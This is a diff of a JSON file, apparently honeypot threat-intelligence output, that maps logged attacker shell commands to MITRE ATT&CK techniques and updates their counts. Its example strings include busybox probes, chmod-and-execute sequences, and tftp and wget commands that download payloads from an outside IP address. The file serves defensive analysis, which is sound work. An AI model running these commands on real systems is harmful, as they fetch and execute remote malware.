@@ -1,5 +1,4 @@
 {
-  "schema_version": "1.0",
   "techniques": [
     {
       "id": "T1027",
@@ -8,8 +7,8 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 79122,
-      "distinct_ips": 331,
+      "count": 79130,
+      "distinct_ips": 332,
       "examples": [
         "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/tmp' > /tmp/.none; /bin/busybox cat /tmp/.none; /bin/busybox rm /tmp/.none",
         "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/dev' > /dev/.none; /bin/busybox cat /dev/.none; /bin/busybox rm /dev/.none",
@@ -25,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 6163,
-      "distinct_ips": 378,
+      "count": 6193,
+      "distinct_ips": 380,
       "examples": [
         "/bin/busybox cp /bin/echo con ; >con; /bin/busybox chmod 777 con; /bin/busybox a4FRFIek ",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -42,8 +41,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2367,
-      "distinct_ips": 352,
+      "count": 2373,
+      "distinct_ips": 354,
       "examples": [
         "/bin/busybox tftp -g -l /tmp/.none -r yCz31g9 113.131.177.217 ; cat /tmp/.none ; rm /tmp/.none ; /bin/busybox a4FRFIek ",
         "/bin/busybox wget http://113.131.177.217:29641/lvn3/eU -O /tmp/.none ; cat /tmp/.none ; rm /tmp/.none ; /bin/busybox a4FRFIek ",
@@ -183,6 +182,6 @@
       ]
     }
   ],
-  "total_commands": 271382,
-  "matched_commands": 86073
+  "total_commands": 271444,
+  "matched_commands": 86111
 }
